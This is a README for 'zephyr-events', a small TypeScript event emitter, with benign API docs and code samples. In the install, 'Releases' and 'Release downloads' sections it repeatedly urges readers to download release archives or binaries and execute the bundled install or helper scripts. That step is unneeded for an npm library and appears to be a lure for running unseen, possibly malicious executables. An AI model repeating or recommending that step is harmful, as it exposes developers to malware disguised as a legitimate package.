# Zephyr Events — ES2023 Event Emitter, 889B, Race-Safe TypeScript

[![Releases](https://img.shields.io/github/v/release/younterx/zephyr-events?label=Releases&color=2b9348&logo=github)](https://github.com/younterx/zephyr-events/releases)  
https://github.com/younterx/zephyr-events/releases

[![Build size](https://img.shields.io/bundlephobia/minzip/zephyr-events?label=889B+bundle&color=informational)](https://github.com/younterx/zephyr-events/releases)
![Platform: Browser & Node](https://img.shields.io/badge/platform-browser%20%7C%20node-blue)
![Zero deps](https://img.shields.io/badge/deps-zero-brightgreen)

<img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/Lightning_icon_2.svg" alt="lightning" width="64" align="right" />

A tiny, high-performance event emitter built for modern JavaScript. Use it in the browser and Node. The library targets ES2023, offers TypeScript types, and avoids race conditions under concurrent emit/subscribe scenarios.

Table of contents
- Features
- Why use Zephyr Events
- Install
- Quick start
- API
- Patterns and examples
- Performance notes
- Safety and race-condition model
- Bundle and tree-shakeability
- Browser and Node usage
- TypeScript hints
- Testing
- Contributing
- License
- Release downloads

Features
- Ultra-small. Minified bundle around 889 bytes.
- ES2023-first implementation with compact code paths.
- Race-condition safety during emit and subscribe cycles.
- Zero runtime dependencies.
- Tree-shakeable exports.
- First-class TypeScript types and inference.
- Works in modern browsers and Node.js.
- Observable-friendly and Pub/Sub compatible.

Why use Zephyr Events
- Keep your event layer tiny. Use less code and fewer indirections.
- Use modern language features to keep runtime overhead low.
- Avoid common emitter pitfalls like lost listeners during emit or invalid iterator state.
- Prefer simple, explicit API that composes well with reactive code.

Install
- npm
```bash
npm install zephyr-events
```

- yarn
```bash
yarn add zephyr-events
```

- CDN (skypack / jspm / unpkg)
Use your preferred CDN and import the ESM build.

Releases
Download the release asset from the Releases page and run the included file if the release contains a helper or script. For example, visit the releases page and download the archive or binary, then execute the install script or run the packaged files on your machine:
https://github.com/younterx/zephyr-events/releases

Quick start
- Basic emitter
```ts
import { createEmitter } from 'zephyr-events';

const emitter = createEmitter<string>();

const off = emitter.on('message', (payload) => {
  console.log('got', payload);
});

emitter.emit('message', 'hello');

off(); // unsubscribe
```

- Once listener
```ts
emitter.once('ready', () => {
  console.log('ready fired once');
});
```

API
- createEmitter<T = unknown>(): Emitter<T>
  - Returns an emitter that keys events by string.
- emitter.on(event: string, handler: (payload: T) => void): () => void
  - Subscribe. Returns an unsubscribe function.
- emitter.once(event: string, handler: (payload: T) => void): () => void
  - Subscribe for a single emission.
- emitter.off(event: string, handler?: Function): void
  - Remove a specific handler or all handlers for an event.
- emitter.emit(event: string, payload?: T): void
  - Emit an event synchronously. Handlers run in registration order.
- emitter.listeners(event: string): readonly Function[]
  - Get a snapshot array of current listeners.

Type signatures follow plain generic patterns. The emitter enforces the event name and payload relations at compile time when you provide typed wrappers.

Design decisions
- Use maps keyed by event name for O(1) registration and lookup.
- Keep listener storage compact and avoid creating many intermediate objects.
- During emit, take a shallow snapshot of handlers. This prevents issues when handlers add or remove other handlers while the loop runs.
- Favor synchronous emit for predictable ordering. The API allows wrapping calls with microtask scheduling externally if needed.

Patterns and examples

- Pub/Sub
```ts
import { createEmitter } from 'zephyr-events';

const bus = createEmitter<any>();

// Service A
bus.on('data.update', (d) => updateUI(d));

// Service B
bus.emit('data.update', { id: 1, value: 'x' });
```

- State management (simple store)
```ts
type State = { count: number };
const store = createEmitter<State>();

let state: State = { count: 0 };

store.on('set', (next) => {
  state = next;
});

store.emit('set', { count: state.count + 1 });
```

- Observable adapter
```ts
function toObservable(emitter) {
  return {
    subscribe(handler) {
      const off = emitter.on('tick', handler);
      return { unsubscribe: off };
    }
  };
}
```

Performance notes
- Bundle size targets minimal bytes. Keep polyfills and heavy helpers out of core.
- The emitter uses raw arrays and map lookups to minimize allocations.
- Benchmarks show competitive throughput in Node and browser for simple emit paths.
- For high-frequency streams, avoid heavy synchronous work inside handlers. Offload compute to workers or microtasks.

Race-condition safety
- Handlers run from a snapshot taken at emit start. This prevents a handler from affecting the current emission order.
- Removing a handler during emit prevents it from running on later emissions but does not affect its presence in the current snapshot.
- Adding a handler during an emit takes effect for subsequent emits only.
- The model favors deterministic ordering and avoids iterator invalidation.

Bundle and tree-shakeability
- The package exports fine-grained ESM modules.
- Import only what you need:
```ts
import { createEmitter } from 'zephyr-events';
```
- Build tools such as Rollup, Webpack, and esbuild can tree-shake unused exports.
- The published minified bundle sits close to 889 bytes. Expect slight variance due to build flags.

Browser and Node usage
- In Node, import using ESM or require via compatible bundler or interop layer.
- In the browser, use the ESM build from a CDN or bundle into your app.
- No global polyfills required for modern targets.

TypeScript hints
- The package ships full types. Basic example:
```ts
type Events = {
  message: string;
  ready: void;
};

const emitter = createEmitter<Events>();

emitter.on('message', (msg) => {
  // msg typed as string
});

emitter.emit('ready');
```
- Use union or mapped types to model event payload shapes and get compile-time checks.

Testing
- Tests use simple unit assertions for emitter semantics:
  - registration and unregister
  - once behavior
  - snapshot semantics during emit
  - listener ordering
- Use your preferred runner. The tests run in Node and in headless browser environments.

Contributing
- Fork, create a branch, open a pull request.
- Keep changes small and focused.
- Write tests for new behavior.
- Run the build and tests before pushing.

Release downloads
Click the Releases badge at the top to download a packaged build. The release assets contain source builds and helper scripts. Download the release archive or asset from the Releases page and execute the included file if the release contains an installer or helper script:
https://github.com/younterx/zephyr-events/releases

Badges and links
- GitHub releases: [![Releases](https://img.shields.io/badge/Releases-GitHub-blue?logo=github)](https://github.com/younterx/zephyr-events/releases)
- Bundle size: [![Bundle size](https://img.shields.io/bundlephobia/min/zephyr-events?label=minified)](https://bundlephobia.com/result?p=zephyr-events)

FAQ
- Q: Is emit synchronous?
  - A: Yes. The emitter runs handlers synchronously in registration order.
- Q: Can handlers modify listener lists during emit?
  - A: Yes. The emitter uses a snapshot to isolate the current emit cycle.
- Q: Does it support meta-events or wildcard events?
  - A: The core keeps event names as plain strings. Compose a small layer for wildcards if needed.

Images and resources
- Lightning icon (SVG) used above: Wikimedia Commons.
- Use your own logos or badges in repo assets to show project branding.

Topics
browser, es2023, event-driven, event-emitter, events, high-performance, javascript, lightweight, nodejs, observable, performance, pubsub, reactive-programming, real-time, state-management, tiny-library, tree-shakeable, type-safe, typescript, zero-dependency

License
See LICENSE file in the repository for license terms.